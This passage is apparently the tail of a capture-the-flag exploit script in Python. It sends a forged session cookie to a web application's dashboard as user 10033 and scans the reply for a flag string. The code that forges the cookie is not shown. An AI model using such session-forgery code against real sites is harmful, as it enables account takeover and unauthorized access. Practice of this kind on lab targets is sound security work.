        # Test with forged cookie
        forged_session = requests.Session()
        forged_session.cookies.set('session', forged_cookie)
        dash_resp = forged_session.get(f"{base_url}/dashboard")

        print(f"\n[+] Dashboard with forged cookie (user_id=10033):")
        print(f"  Status: {dash_resp.status_code}")
        print(f"  URL: {dash_resp.url}")
        print(f"  Length: {len(dash_resp.text)}")

        if 'FLAG' in dash_resp.text:
            flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
            print(f"  [!] FLAG: {flag_match.group(0) if flag_match else 'Pattern found'}")

    except Exception as e:
        print(f"[!] Cookie manipulation failed: {e}")

